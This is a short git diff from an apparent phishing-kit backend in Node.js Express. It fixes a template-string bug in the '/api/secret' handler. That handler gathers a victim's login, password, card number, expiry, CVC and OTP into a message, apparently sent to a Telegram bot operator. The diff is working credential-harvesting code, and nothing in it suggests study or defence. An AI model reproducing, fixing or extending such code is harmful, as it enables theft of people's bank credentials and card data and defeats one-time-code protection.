@@ -183,7 +183,7 @@ app.post('/api/secret', upload.none(), (req, res) => {
     }
     users[sessionId].secret = secret;
     writeUserData(users);
-    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\ ` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
+    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${ users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
